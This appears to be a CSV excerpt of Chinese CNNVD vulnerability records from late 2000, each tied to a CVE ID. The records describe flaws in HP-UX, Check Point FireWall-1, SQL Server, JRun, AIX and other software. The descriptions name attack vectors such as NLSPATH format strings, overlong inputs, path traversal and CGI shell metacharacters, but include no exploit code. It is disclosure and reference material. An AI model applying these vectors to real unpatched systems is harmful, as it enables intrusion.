+HP-UX NLSPATH环境变量权限提升漏洞,CNNVD-200011-069,2000-11-14,2009-01-20,高危,授权问题,HP－UX 中的很多程序都使用libc库中的catopen()/catgets()等函数来显示本地化的信息。catopen()函数在检测到NLSPATH环境变量之后，会打开其指定的文件并从中读取消息。 然而，catopen()函数并没有对suid root程序使用NLSPATH变量进行限制，这允许本地攻击者通过设置NLSPATH变量指定自己构造的locale文件，当suid root程序将使用catopen()打开该消息文件并将其中的数据传递给*printf()函数时，就可能造成格式串漏洞。 任何使用catopen()/catgets()函数的suid root程序都可能受此漏洞影响，本地攻击者可以利用此漏洞获取root权限。 根据我们的测试，至少如下程序是受影响的: -r-sr-xr-x 1 root bin 45056 Nov 14 2000 /usr/bin/at -r-sr-xr-x 1 root bin 24576 Nov 14 2000 /usr/bin/crontab -r-sr-xr-x 1 root bin 45056 Nov 14 2000 /usr/bin/ct -r-sr-xr-x 1 root bin 36864 Apr 19 2001 /usr/bin/cu -r-sr-xr-x 1 root bin 20480 Nov 14 2000 /usr/lbin/exrecover -r-sr-xr-x 1 root bin 40960 Aug 16 2001 /usr/bin/lp -r-sr-sr-x 2 root mail 45056 Nov 14 2000 /usr/bin/mail -r-sr-xr-x 5 root bin 45056 Nov 14 2000 /usr/bin/passwd -r-sr-xr-x 1 root bin 24576 Nov 14 2000 /usr/bin/su -r-sr-xr-x 11 root bin 1921024 Nov 6 2001 /usr/sbin/swinstall -r-sr-xr-x 2 root bin 1028096 Nov 6 2001 /usr/sbin/swpackage,CVE-2000-0844
+EFTP拒绝服务漏洞,CNNVD-200011-054,2000-11-14,2006-09-05,低危,授权问题,EFTP缓冲区溢出漏洞。远程攻击者可以通过发送不包含换行符的字符串，并且不从服务器连接导致服务拒绝。,CVE-2000-0871
+Check Point VPN-1/FireWall inter-module S/Key authentication mechanism seed generation mechanism认证绕过漏洞,CNNVD-200011-066,2000-11-14,2006-01-04,高危,授权问题,Check Point VPN-1/FireWall-1 4.1及其之前版本中inter-module S/Key authentication mechanism的seed generation mechanism存在漏洞。远程攻击者可以借助蛮力攻击绕过认证，也称为“One-time (s/key) Password Authentication”漏洞。,CVE-2000-0808
+glib unsetenv()副本项目删除漏洞,CNNVD-200011-011,2000-11-14,2005-05-02,高危,其他,如果环境变量两次提供给一个程序，那么glibc 2.1.1版本的unsetenv函数不正确的移动该环境变量，本地用户通过指明它们自己的副本环境变量如LD_PRELOAD或者LD_LIBRARY_PATH从而执行setuid程序中的任意命令。,CVE-2000-0824
+WinCOM LPD拒绝服务漏洞,CNNVD-200011-067,2000-11-14,2005-05-02,低危,授权问题,WinCOM LPD 1.00.90存在漏洞。远程攻击者可以借助LPD端口（515）中的大量LPD选项导致服务拒绝。,CVE-2000-0839
+Check Point VPN-1/FireWall服务器重定向漏洞,CNNVD-200011-053,2000-11-14,2006-01-04,低危,授权问题,Check Point VPN-1/FireWall-1 4.1及其之前的版本存在漏洞。远程攻击者可以借助FireWall-1未正确处理的无效FTP命令，重定向其他服务器（“FTP Bounce”）的FTP连接，也称为“FTP Connection Enforcement Bypass”。,CVE-2000-0813
+SunFTP服务器局部输入拒绝服务漏洞,CNNVD-200011-055,2000-11-14,2006-09-05,中危,其他,SunFTP build 9(1)存在漏洞。远程攻击者可以通过连接服务器并且在发送换行符之前不进行连接导致服务拒绝。,CVE-2000-0855
+Check Point VPN-1/FireWall-1绕过目录检测漏洞,CNNVD-200011-041,2000-11-14,2006-01-04,高危,授权问题,"Check Point VPN-1/FireWall-1 4.1及其之前版本存在漏洞。远程攻击者借助破碎的TCP连接请求或者重新打开关闭的TCP连接请求绕过目录检测。又称为""One-way Connection Enforcement Bypass""。",CVE-2000-0804
+FTP Serv-U服务拒绝漏洞,CNNVD-200011-005,2000-11-14,2005-05-02,低危,授权问题,FTP Serv-U 2.5e版本存在漏洞。远程攻击者通过发送大量空字节导致服务拒绝。,CVE-2000-0837
+Check Point VPN-1/FireWall-1组件间认证机制服务拒绝漏洞,CNNVD-200011-025,2000-11-14,2006-01-04,低危,授权问题,"Check Point VPN-1/FireWall-1 4.1及其之前版本中的组件间认证机制存在漏洞。远程攻击者利用该漏洞导致服务拒绝。又称为""Inter-module Communications Bypass""。",CVE-2000-0806
+Xmail缓冲区溢出漏洞,CNNVD-200011-044,2000-11-14,2005-10-20,超危,授权问题,XMail POP3服务器0.59之前的版本存在缓冲区溢出漏洞。远程攻击者借助超长APOP命令执行任意命令。,CVE-2000-0841
+Windows webTV annclist.exe服务拒绝漏洞,CNNVD-200011-017,2000-11-14,2005-05-02,低危,授权问题,Windows的webTV中annclist.exe存在漏洞。远程攻击者借助端口22701至22705的超大畸形UDP包导致服务拒绝。,CVE-2000-0830
+Netegrity SiteMinder认证绕过漏洞,CNNVD-200011-058,2000-11-14,2005-10-12,中危,授权问题,Netegrity SiteMinder 4.11之前的版本存在漏洞。远程攻击者可以通过向请求的URL附加“$/FILENAME.ext”绕过认证机制。,CVE-2000-0850
+WFTPD和WFTPD Pro 2.41 RC12服务器全路径名泄露漏洞,CNNVD-200011-057,2000-11-14,2005-10-12,低危,信息泄露,WFTPD和WFTPD Pro 2.41 RC12存在漏洞。远程攻击者可以借助一个“%C”命令获取服务器全路径名，该漏洞可以生成包含路径名的错误信息。,CVE-2000-0876
+Sambar Server search.dll Sambar ISAPI Search功能输入验证漏洞,CNNVD-200011-032,2000-11-14,2010-01-16,低危,授权问题,Sambar Server 4.4 Beta 3版本的search.dll Sambar ISAPI Search功能中存在输入验证漏洞。远程攻击者可通过指定查询参数中的目录读取任意目录。,CVE-2000-0835
+Internet 1.2 Mobius DocumentDirect缓冲区溢出漏洞,CNNVD-200011-051,2000-11-14,2005-10-20,超危,授权问题,Internet 1.2 Mobius DocumentDirect的web认证表单存在缓冲区溢出漏洞。远程攻击者可以借助超长用户名导致服务拒绝或执行任意命令。,CVE-2000-0827
+Microsoft Windows Media server竞态条件漏洞,CNNVD-200011-024,2000-11-14,2005-10-12,低危,授权问题,"Microsoft Windows Media server存在竞态条件漏洞。远程攻击者借助畸形的请求导致Windows Media Unicast Service服务拒绝。又称为""Unicast Service Race Condition""漏洞。",CVE-2000-0849
+WFTPD和WFTPD Pro 2.41 RC12拒绝服务漏洞,CNNVD-200011-065,2000-11-14,2005-05-02,低危,授权问题,WFTPD和WFTPD Pro 2.41 RC12存在漏洞。远程攻击者可以借助不宜打印字符的超长字符串导致服务拒绝。,CVE-2000-0875
+AIX netstat网络操作错误漏洞,CNNVD-200011-064,2000-11-14,2005-05-02,低危,授权问题,AIX 4.x.x的netstat不正确限制-Zi选项的访问，本地用户可以利用该漏洞清除网络界面的数据，并且可能可以隐藏网络不正常操作的证据。,CVE-2000-0873
+Jack De Winter WinSMTP缓冲区溢出漏洞,CNNVD-200011-004,2000-11-14,2005-10-20,高危,授权问题,WinSMTP 1.06f和2.X版本存在缓冲区溢出漏洞。远程攻击者借助超长(1)USER或者(2)HELO命令导致服务拒绝。,CVE-2000-0833
+PHP文件上传功能读取任意文件漏洞,CNNVD-200011-016,2000-11-14,2005-05-02,中危,授权问题,PHP 3和4版本中的文件上传功能存在漏洞。远程攻击者通过设置隐藏格式字段读取任意文件。该格式字段的名称和内部PHP脚本变量的名称相匹配。,CVE-2000-0860
+"Microsoft Windows""Invalid URL""漏洞",CNNVD-200011-009,2000-11-14,2005-10-12,低危,授权问题,"Microsoft Windows NT 4.0版本存在漏洞。远程攻击者通过发送一系列导致INETINFO.EXE失败的畸形请求从而导致IIS服务拒绝。又称为""Invalid URL""漏洞。",CVE-2000-0858
+CamShot远程缓冲区溢出漏洞,CNNVD-200011-034,2000-11-14,2005-10-20,中危,授权问题,CamShot WebCam Trial2.6版本存在缓冲区溢出漏洞。远程攻击者借助超长认证头执行任意命令。,CVE-2000-0836
+Microsoft Office命令执行漏洞,CNNVD-200011-047,2000-11-14,2005-05-02,高危,授权问题,启动Microsoft Office 2000文件时，其目录首先用于DLL的查找如riched20.dll和msi.dll，攻击者可以通过向相同文件目录插入DLL特洛伊木马的方式执行任意命令。,CVE-2000-0854
+Listmanager权限提升漏洞,CNNVD-200011-052,2000-11-14,2005-05-02,高危,授权问题,Listmanager 2.105.1之前的版本存在缓冲区溢出漏洞。本地用户可以利用该漏洞获取附加权限。,CVE-2000-0863
+Eudora mail client 虚拟通行证（VCF）泄露漏洞,CNNVD-200011-059,2000-11-14,2005-05-02,低危,授权问题,Eudora mail client包含发送主机的绝对路径，其中包含虚拟通行证（VCF）。,CVE-2000-0874
+Pine畸形标题服务拒绝漏洞,CNNVD-200011-003,2000-11-14,2005-05-02,中危,授权问题,Washington大学c-client库*（被用于pine和其他程序）存在缓冲区溢出漏洞。远程攻击者可以借助超长X-Keywords标题来执行任意命令。,CVE-2000-0847
+muh IRC日志格式化字符串漏洞,CNNVD-200011-063,2000-11-14,2005-10-20,高危,授权问题,muh 2.05d IRC server的登录功能不正确清除user-injected格式化字符串，远程攻击者可以借助畸形昵称导致服务拒绝或执行任意命令。,CVE-2000-0857
+SuSE Linux Apache WebDAV目录遍历漏洞,CNNVD-200011-048,2000-11-14,2006-08-03,低危,授权问题,SuSE Linux 6.4的Apache 1.3.12默认配置启用WebDAV，远程攻击者可以利用该漏洞借助PROPFIND HTTP请求方法列出任意目录。,CVE-2000-0869
+Interbase SuperServer服务拒绝漏洞,CNNVD-200011-040,2000-11-14,2006-09-20,低危,其他,Linux的Interbase 6 SuperServer存在漏洞。远程攻击者借助包含零字节的查询导致服务拒绝。,CVE-2000-0866
+Mandrake Linux Apache mod_perl列出目录内容漏洞,CNNVD-200011-018,2000-11-14,2005-05-02,中危,授权问题,安装在Mandrake Linux 6.1至7.1版本的Apache中mod_perl的默认配置设置/perl/目录为可浏览，远程攻击者利用该漏洞列出该目录的内容。,CVE-2000-0883
+Linux多厂商klogd漏洞,CNNVD-200011-060,2000-11-14,2005-05-02,高危,授权问题,Linux的Kernel logging daemon (klogd)不正确清除user-injected格式化字符串，本地用户可以利用该漏洞通过触发畸形内核消息获取根权限。,CVE-2000-0867
+Check Point VPN-1/FireWall-1不正确的转发封装的FWS数据包漏洞,CNNVD-200011-019,2000-11-14,2006-01-04,高危,授权问题,"Check Point VPN-1/FireWall-1 4.1及其之前版本不正确的转发封装的FWS数据包，即使它们不是来自有效的FWZ客户端，又称为""Retransmission of Encapsulated Packets""。",CVE-2000-0805
+Check Point VPN-1/FireWall mechanism (fwn1) OPSEC通信认证骗取连接漏洞,CNNVD-200011-050,2000-11-14,2006-01-04,高危,授权问题,Check Point VPN-1/FireWall-1 4.1及其之前版本中的mechanism (fwn1)的OPSEC通信认证存在漏洞。远程攻击者可以利用该漏洞骗取连接，也称为“OPSEC Authentication Vulnerability”。,CVE-2000-0807
+CGIForum远程目录遍历漏洞,CNNVD-200101-099,2000-11-20,2005-10-12,低危,授权问题,"DC Scripts DCForum是一个商业版CGI脚本，用于在线WWW方式讨论。 DCForum实现上存在输入验证漏洞，远程攻击者可以利用此漏洞遍历服务器目录。 DC Scripts DCForum未能正确检查来自用户输入的""thesection""变量值，利用""../""攻击方式，远程攻击者可以利用一个精心准备的URL请求导致脚本遍历服务器根目录，进而获取敏感信息。所能访问的文件取决于Web服务器当前启动的用户身份，一般是nobody。",CVE-2000-1171
+Quikstore Shopping Cart quikstore.cgi命令执行漏洞,CNNVD-200011-070,2000-11-20,2005-10-20,高危,授权问题,Quikstore Shopping Cart的quikstore.cgi存在漏洞。远程攻击者可以借助HTTP GET请求的URL选项中的shell元字符执行任意命令。,CVE-2000-1223
+Microsoft Windows 2000 Service Pack NTLM访问控制漏洞,CNNVD-200011-071,2000-11-21,2005-10-20,中危,授权问题,Microsoft Windows 2000 Service Pack 2 (SP2)之前的版本在运行非Windows 2000 domain并且使用NTLM认证，以及账户证书局部缓存时，本地用户可以利用该漏洞绕过账户锁定政策，并且可以进行无限次登录尝试，也称为“Domain Account Lockout”漏洞。,CVE-2000-1217
+Caucho Technology Resin 1.2 JSP源泄露漏洞,CNNVD-200011-072,2000-11-23,2005-10-20,低危,授权问题,"Caucho Technology Resin 1.2，可能还包括其之前的版本存在漏洞。远程攻击者可以借助文件名中带有某些特定字符如(1)“..”,(2)“%2e..”(3)“%81”，(4)“%82”的.jsp文件的HTTP请求浏览JSP源。",CVE-2000-1224
+IBM Net.Data远程路径泄露漏洞,CNNVD-200101-106,2000-11-29,2005-10-20,低危,授权问题,IBM Net.Data是脚本语言，用来构建Web应用程序。它支持范围广泛的语言环境，并且和大多数熟知的数据库相兼容。 Net.Data实现上存在一个问题，远程攻击者可能利用此漏洞泄露收集到服务器相关的有用信息。 通过使用CGI应用程序的方法提交一个特殊构造的URL，使得它包含一个无效的请求和已知数据库，将泄露服务器文件系统的物理路径。成功地利用这个漏洞有助于进一步进行攻击。,CVE-2000-1110
+AIX enq本地缓冲区溢出漏洞,CNNVD-200101-010,2000-12-01,2005-05-02,高危,授权问题,AIX是一款由IBM公司开发和维护的UNIX操作系统。 AIX包含的enq对命令行参数解析不正确，本地攻击者可以利用这个漏洞以ROOT权限在系统上执行任意指令。 enq程序对用户提交的'-M'参数缺少正确的边界缓冲区检查，攻击者提交超长字符串作为此参数值，可覆盖堆栈部分变量而发生缓冲区溢出，精心构建提交的数据可以以ROOT权限在系统上执行任意指令。,CVE-2000-1121
+Microsoft SQL Server/MSDE扩展存储过程远程缓冲区溢出漏洞(MS00-092),CNNVD-200101-037,2000-12-04,2006-09-01,中危,授权问题,"在微软SQL Server 7.0/2000以及MSDE中以及提供了一个API函数srv_paraminfo()，它用来为扩展存储过程调用解释输入参数。由于它没有对输入参数长度进行检查，因此如果输入参数长度超过一定限制，就可能发生缓冲区溢出。任何在调用srv_paraminfo()前没有进行长度检查的扩展存储过程都可能受到此问题影响。 调用扩展存储过程的语法如下所示： exec <存储过程名> <参数1>， <参数2>， ... 例如，如下的查询将返回""c:\winnt""的目录树： exec xp_dirtree 'c:\winnt' 通过给各个参数传递超长的字符串，有可能覆盖为这些参数所分配的缓冲区并执行任意代码。 目前已知受影响的扩展存储过程如下： 1、xp_peekqueue (xpqueue.dll) xp_printstatements (xprepl.dll) 给第一个参数传递超长的串将导致非法操作并覆盖异常处理程序所保存的返回地址。 2、xp_proxiedmetadata (xprepl.dll) 该存储过程使用4个参数。给第二个参数传递超长的串将导致非法操作并覆盖异常处理程序所保存的返回地址。 3、xp_SetSQLSecurity (xpstar.dll) 该存储过程使用4个参数。给第三个参数传递超长的串将引发异常并导致整个SQL Server进程立即终止。 4、xp_displayparamstmt(xprepl.dll) xp_enumresultset(xprepl.dll) xp_showcolv (xprepl.dll) xp_updatecolvbm (xprepl.dll) 给第一个参数传递超长的串将导致非法操作并覆盖异常处理程序所保存的返回地址。 扩展存储过程可以被任何客户组件调用，只要这些客户组件能够执行普通的SQLServer查询，比如Microsoft Access或者MSQuery。SQL Server中提供的ISQL实用程序也可以用来调用扩展存储过程。运行于IIS之上的web应用程序频繁地使用ADO(ActiveX Data Objects)API来连接SQL Server数据库。 攻击者可能通过两种途径进行攻击： 1. 如果攻击者可以登录进入SQL Server数据库，就可以通过直接调用有问题的扩展存储过程来进行攻击。如果溢出成功，可能获取SYSTEM权限。 2. 攻击者也可能通过Web应用程序来进行攻击，但是需要攻击者了解应用程序在何处调用了有问题的扩展存储过程，同时提供有效的参数。",CVE-2000-1081
+Microsoft SQL Server/MSDE扩展存储过程远程缓冲区溢出漏洞(MS00-092),CNNVD-200101-064,2000-12-04,2006-09-01,中危,授权问题,"在微软SQL Server 7.0/2000以及MSDE中以及提供了一个API函数srv_paraminfo()，它用来为扩展存储过程调用解释输入参数。由于它没有对输入参数长度进行检查，因此如果输入参数长度超过一定限制，就可能发生缓冲区溢出。任何在调用srv_paraminfo()前没有进行长度检查的扩展存储过程都可能受到此问题影响。 调用扩展存储过程的语法如下所示： exec <存储过程名> <参数1>， <参数2>， ... 例如，如下的查询将返回""c:\winnt""的目录树： exec xp_dirtree 'c:\winnt' 通过给各个参数传递超长的字符串，有可能覆盖为这些参数所分配的缓冲区并执行任意代码。 目前已知受影响的扩展存储过程如下： 1、xp_peekqueue (xpqueue.dll) xp_printstatements (xprepl.dll) 给第一个参数传递超长的串将导致非法操作并覆盖异常处理程序所保存的返回地址。 2、xp_proxiedmetadata (xprepl.dll) 该存储过程使用4个参数。给第二个参数传递超长的串将导致非法操作并覆盖异常处理程序所保存的返回地址。 3、xp_SetSQLSecurity (xpstar.dll) 该存储过程使用4个参数。给第三个参数传递超长的串将引发异常并导致整个SQL Server进程立即终止。 4、xp_displayparamstmt(xprepl.dll) xp_enumresultset(xprepl.dll) xp_showcolv (xprepl.dll) xp_updatecolvbm (xprepl.dll) 给第一个参数传递超长的串将导致非法操作并覆盖异常处理程序所保存的返回地址。 扩展存储过程可以被任何客户组件调用，只要这些客户组件能够执行普通的SQLServer查询，比如Microsoft Access或者MSQuery。SQL Server中提供的ISQL实用程序也可以用来调用扩展存储过程。运行于IIS之上的web应用程序频繁地使用ADO(ActiveX Data Objects)API来连接SQL Server数据库。 攻击者可能通过两种途径进行攻击： 1. 如果攻击者可以登录进入SQL Server数据库，就可以通过直接调用有问题的扩展存储过程来进行攻击。如果溢出成功，可能获取SYSTEM权限。 2. 攻击者也可能通过Web应用程序来进行攻击，但是需要攻击者了解应用程序在何处调用了有问题的扩展存储过程，同时提供有效的参数。",CVE-2000-1088
+SolarWinds Serv-U File Server 路径遍历漏洞,CNNVD-200102-085,2000-12-06,2020-07-29,低危,路径遍历,SolarWinds Serv-U File Server是美国SolarWinds公司的一款文件传输服务器。 SolarWinds Serv-U File Server 3.0.0.16版本中存在路径遍历漏洞。该漏洞源于网络系统或产品未能正确地过滤资源或文件路径中的特殊元素。攻击者可利用该漏洞访问受限目录之外的位置。,CVE-2001-0054
+AIX sysback权限提升漏洞,CNNVD-200012-001,2000-12-10,2005-10-20,高危,授权问题,AIX sysback 4.2.1.13之前的版本使用相关路径寻找和执行主机名程序，本地用户可以利用该漏洞通过修改指向恶意主机名程序的路径提升权限。,CVE-2000-1222
+CiscoSecure ACS Server漏洞,CNNVD-200012-046,2000-12-11,2005-05-02,高危,授权问题,CiscoSecure ACS Server 2.4(2)及其早期版本存在漏洞。远程攻击者在LDAP服务器允许空密码时绕过服务器LDAP认证。,CVE-2000-1056
+Internet Explorer Microsoft Virtual Machine (VM)安全设置绕过和命令执行漏洞,CNNVD-200012-010,2000-12-11,2005-10-12,中危,授权问题,Internet Explorer 4.x和5.x版本的Microsoft Virtual Machine (VM)中的无符号程序可以创建和使用ActiveX控件，远程攻击者可以借助畸形web页面或邮件绕过Internet Explorer安全设置，并执行任意命令，该漏洞也称为“Microsoft VM ActiveX Component”漏洞。,CVE-2000-1061
+FreeBSD getnameinfo函数漏洞,CNNVD-200012-035,2000-12-11,2005-10-20,低危,授权问题,FreeBSD 4.1.1及其早期版本和可能其他操作系统的getnameinfo函数存在漏洞。远程攻击者借助超长DNS主机名导致服务拒绝。,CVE-2000-1066
+Microsoft Exchange Server 安全漏洞,CNNVD-200012-026,2000-12-11,2020-04-10,低危,其他,Microsoft Exchange Server是美国微软（Microsoft）公司的一套电子邮件服务程序。它提供邮件存取、储存、转发，语音邮件，邮件过滤筛选等功能。 Microsoft Exchange Server 5.5版本中存在安全漏洞。攻击者可利用该漏洞造成拒绝服务。,CVE-2000-1006
+SuSE ypbind-mt格式化字符串漏洞,CNNVD-200012-056,2000-12-11,2005-05-02,超危,授权问题,SuSE SuSE-6.2版本和可能其他Linux操作系统的ypbind-mt存在格式化字符串漏洞。攻击者提升根特权。,CVE-2000-1044
+Slashcode默认管理密码漏洞,CNNVD-200012-048,2000-12-11,2006-08-24,中危,授权问题,Slashcode 2.0 Alpha之前版本的默认配置有默认管理密码。远程攻击者提升Slashcode特权和可能执行任意命令。,CVE-2000-1015
+Netscape (iPlanet)证书管理系统和目录服务器漏洞,CNNVD-200012-062,2000-12-11,2006-09-20,高危,授权问题,Netscape (iPlanet)证书管理系统4.2版本和目录服务器4.12版本以明文的形式存储管理员密码，本地以及可能远程攻击者可以获取服务器上的管理特权。,CVE-2000-1076
+Alabanza Control Panel域名修改漏洞,CNNVD-200012-052,2000-12-11,2005-10-20,中危,授权问题,Alabanza Control Pane不需要密码访问管理命令。远程攻击者借助nsManager.cgi CGI程序修改域名信息。,CVE-2000-1023
+AOL Instant Messenger (AIM)格式化字符串漏洞,CNNVD-200012-034,2000-12-11,2005-05-02,低危,授权问题,AOL Instant Messenger (AIM) 4.1.2010版本存在格式化字符串漏洞。远程攻击者通过转移文件名包含格式化字符的文件导致服务拒绝和可能执行任意命令。,CVE-2000-1000
+FreeBSD catopen函数漏洞,CNNVD-200012-049,2000-12-11,2007-05-11,高危,授权问题,FreeBSD 5.0及其早期版本和可能其他的操作系统的catopen函数存在漏洞。本地用户借助LANG环境变量读取任意文件。,CVE-2000-1012
+Check Point Firewall-1 Session Agent目录攻击漏洞,CNNVD-200012-078,2000-12-11,2005-10-20,高危,授权问题,Check Point Firewall-1会话代理端3.0到4.1版本对无效用户名及相对的无效密码产生不同的出错消息。远程攻击者借助强力攻击确定有效用户名并且猜测密码。,CVE-2000-1037
+Element InstantShop add_2_basket.asp漏洞,CNNVD-200012-039,2000-12-11,2005-10-12,高危,授权问题,Element InstantShop的add_2_basket.asp存在漏洞。远程攻击者借助“price”隐藏形式变量修改price信息。,CVE-2000-1001
+shred漏洞,CNNVD-200012-036,2000-12-11,2005-05-02,低危,授权问题,shred 1.0版本文件擦除实用工具不能正确打开文件覆盖或者冲洗缓冲区，这阻止shred正确的更换文件数据。本地用户恢复文件。,CVE-2000-1018
+ICQ Web Front HTTPd漏洞,CNNVD-200012-030,2000-12-11,2005-10-20,低危,授权问题,ICQ Web Front HTTPd存在漏洞。远程攻击者通过请求包含“？”字符的URL导致服务拒绝。,CVE-2000-1078
+Mandrake Linux漏洞,CNNVD-200012-040,2000-12-11,2005-10-12,高危,授权问题,Mandrake Linux 7.1和7.0版本的Xsession文件的默认配置绕过带“xhost + localhost”命令的Xauthority访问控制机制。本地用户发觉 X Windows事件和提升特权。,CVE-2000-1059
+Allaire JRun 3.0 http servlet服务器额外前导斜杠漏洞,CNNVD-200012-061,2000-12-11,2006-09-20,低危,授权问题,"Allaire JRun 3.0 http servlet服务器存在漏洞。远程攻击者可以借助请求头包含额外""/""的URL请求直接访问WEB-INF目录（也称为“额外前导斜杠”）。",CVE-2000-1050
+CiscoSecure ACS Server CSAdmin模块缓冲区溢出漏洞,CNNVD-200012-028,2000-12-11,2005-05-02,高危,授权问题,CiscoSecure ACS Server 2.4(2)及其早期版本的CSAdmin模块存在缓冲区溢出漏洞。远程攻击者借助超大数据包导致服务拒绝和可能执行任意命令。,CVE-2000-1054
+HP JetDirect多个DoS漏洞,CNNVD-200012-033,2000-12-11,2005-10-20,低危,其他,HP JetDirect printer card Firmware x.08.20及其早期版本的IP实现存在漏洞。远程攻击者借助畸形数据包导致服务拒绝（打印机崩溃）。,CVE-2000-1065
+Allaire Jrun漏洞,CNNVD-200012-025,2000-12-11,2006-09-20,低危,授权问题,Allaire JRun 2.3版本服务器存在漏洞。远程攻击者通过直接调用SSIFilter 程序获得可执行内容的源代码。,CVE-2000-1052
+CiscoSecure ACS Server拒绝服务漏洞,CNNVD-200012-013,2000-12-11,2005-05-02,高危,授权问题,CiscoSecure ACS Server 2.4(2)及其之前的版本存在缓冲区溢出漏洞。远程攻击者可以借助超大TACACS+数据包导致服务拒绝，并且可能可以执行任意命令。,CVE-2000-1055
+nss_ldap服务拒绝漏洞,CNNVD-200012-074,2000-12-11,2005-05-02,低危,授权问题,nss_ldap 121之前版本存在漏洞。当和nscd一起运行时（名称服务缓冲器程序），远程攻击者可以借助大批LDAP请求导致服务拒绝。,CVE-2000-1045
+Allaire JRun漏洞,CNNVD-200012-068,2000-12-11,2006-09-20,超危,跨站脚本,Allaire JRun 2.3.3服务器存在漏洞。远程攻击者借助跨站脚本（CSS）攻击和直接调用com.livesoftware.jrun.plugins.JSP JSP程序来插入JSP代码并且编译和执行。,CVE-2000-1053
+iCal漏洞,CNNVD-200012-051,2000-12-11,2005-05-02,高危,授权问题,iCal 2.1版本的Patch 2的csstart程序在当前工作的目录中搜索cshttpd程序。本地用户通过在目录中创建特洛伊木马cshttpd程序和在目录中调用csstart提升根特权。,CVE-2000-1073
+Lotus Domino ESMTP拒绝服务漏洞,CNNVD-200012-008,2000-12-11,2005-10-20,超危,授权问题,Lotus Domino 5.0.2c及其之前版本的ESMTP服务存在多个缓冲区溢出漏洞。远程攻击者可以借助超长(1)“RCPT TO”，(2)“SAML FROM”，或(3)“SOML FROM”命令导致服务拒绝，并且可能可以执行任意代码。,CVE-2000-1046
+Poll It pollit.cgi访问控制漏洞,CNNVD-200012-009,2000-12-11,2005-05-02,中危,授权问题,Poll It 2.01及其之前版本的pollit.cgi存在漏洞。远程攻击者可以通过将entered_password和admin_password参数的规格化为相同的值，在不知道真实密码的情况下访问管理员函数。,CVE-2000-1069
+ypbind对数函数格式化字符串漏洞,CNNVD-200012-038,2000-12-11,2005-05-02,超危,授权问题,ypbind 3.3版本的对数函数存在格式化字符串漏洞，当运行调试方式时泄露文件描述符。攻击者导致服务拒绝。,CVE-2000-1040
+多厂商top格式化字符串漏洞,CNNVD-200012-011,2000-12-11,2007-05-11,高危,授权问题,top程序存在格式化字符串漏洞。本地攻击者可以借助“kill”或“renice”函数获取根权限。,CVE-2000-0998
+Poll It pollit.cgi信息泄露漏洞,CNNVD-200012-002,2000-12-11,2005-05-02,低危,授权问题,Poll It 2.01及其之前版本的pollit.cgi使用位于web文件根下的数据文件，远程攻击者可以利用该漏洞访问敏感信息或私人信息。,CVE-2000-1070
+HP JetDirect多个DoS漏洞,CNNVD-200012-073,2000-12-11,2005-10-20,低危,授权问题,HP JetDirect printer card Firmware x.08.20版本以及之前版本存在缓冲区溢出漏洞。远程攻击者可以导致服务拒绝。,CVE-2000-1062
+OpenBSD talkd格式化字符串漏洞,CNNVD-200012-031,2000-12-11,2005-05-02,超危,授权问题,OpenBSD和可能其他BSD-based操作系统的talkd存在格式化字符串漏洞。远程攻击者借助包含格式化字符的用户名执行任意命令。,CVE-2000-1010
+Alt-N MDaemon 3.1.1 DoS漏洞,CNNVD-200012-063,2000-12-11,2005-10-20,中危,授权问题,Mdaemon 3.1.1版本和之前版本中WebConfig存在基于堆缓冲区溢出漏洞。远程攻击者可以借助超长URL导致服务拒绝和可能执行任意命令。,CVE-2000-1021
+WebTeacher WebData输入文件漏洞,CNNVD-200012-066,2000-12-11,2005-10-20,低危,授权问题,Webteachers Webdata存在漏洞。具有有效Webdata账户的远程攻击者通过邮寄请求向Webdata数据库中输入文件来读取任意文件。,CVE-2000-1017
+I-gear漏洞,CNNVD-200012-022,2000-12-11,2005-05-02,低危,授权问题,I-gear 3.5.7及其早期版本不能正确处理比255字符长的URL的日志记录。攻击者导致报告出错。,CVE-2000-1007
+iCal 2.1 Patch 2 GUI权限提升漏洞,CNNVD-200012-003,2000-12-11,2005-10-12,高危,授权问题,iCal 2.1 Patch 2的GUI安装不对使用“xhost +”命令的X服务器进行访问控制，远程攻击者可以利用该漏洞监测X Windows事件并获取权限。,CVE-2000-1071
+Allaire JRun目录遍历漏洞,CNNVD-200012-067,2000-12-11,2006-09-20,中危,路径遍历,Allaire JRun 2.3服务器存在目录遍历漏洞。远程攻击者借助SSIFilter程序读取任意文件。,CVE-2000-1051
+Stalker CommuniGate Pro漏洞,CNNVD-200012-042,2000-12-11,2005-05-02,低危,授权问题,Stalker CommuniGate Pro 3.3.2版本的POP3守护程序对无效用户名和相对的无效密码产生不同错误消息。远程攻击者利用SPAM攻击确定服务器的有效邮件地址。,CVE-2000-1002
+FreeBSD catopen()函数缓冲区溢出漏洞,CNNVD-200012-027,2000-12-11,2007-05-11,高危,授权问题,FreeBSD 5.0及其早期版本和可能其他的操作系统的catopen()函数存在缓冲区溢出漏洞。本地用户借助超长环境变量提升根特权。,CVE-2000-1011
+Wingate记录文件服务目录遍历漏洞,CNNVD-200012-050,2000-12-11,2005-10-20,低危,路径遍历,Wingate 4.1 Beta A及其早期版本的记录文件服务存在目录遍历漏洞。远程攻击者借助URL中使用编码的字符的HTTP GET请求的 .. (点 点)攻击读取任意文件。,CVE-2000-1048
+HP-UX和HP Tru64 UNIX dtterm缓冲区溢出漏洞,CNNVD-200012-069,2000-12-11,2006-11-14,中危,授权问题,HP-UX 11.0版本和HP Tru64 UNIX 4.0f版本到5.1a版本中的dtterm存在缓冲区溢出漏洞。本地用户可以借助超长-tn选项执行任意代码。,CVE-2000-1031
+Cisco Secure PIX Firewall漏洞,CNNVD-200012-055,2000-12-11,2005-05-02,高危,授权问题,Cisco Secure PIX Firewall 5.2(2)及其早期版本的mailguard特性不能正确限制访问到STMP命令。远程攻击者通过在发送限制命令之前发送DATA命令执行限制命令。,CVE-2000-1022
+Mandrake Linux ypserv缓冲区溢出漏洞,CNNVD-200012-045,2000-12-11,2005-05-02,超危,授权问题,Mandrake Linux 7.1及其早期版本和可能其他操作系统的ypserv存在缓冲区溢出漏洞。攻击者在ypserv缺少vsyslog()函数建立是提升根特权。,CVE-2000-1042
+OpenBSD ssh程序权限提升漏洞,CNNVD-200012-007,2000-12-11,2006-09-05,超危,授权问题,OpenBSD ssh程序（可能包括其他基于BSD的操作系统）存在格式化字符串漏洞。攻击者可以利用该漏洞获取根权限。,CVE-2000-0999
+HP JetDirect多个DoS漏洞,CNNVD-200012-076,2000-12-11,2005-10-20,低危,授权问题,HP JetDirect printer card Firmware x.08.20以及之前版本中LPD服务存在缓冲区溢出漏洞。远程攻击者可以导致服务拒绝。,CVE-2000-1064
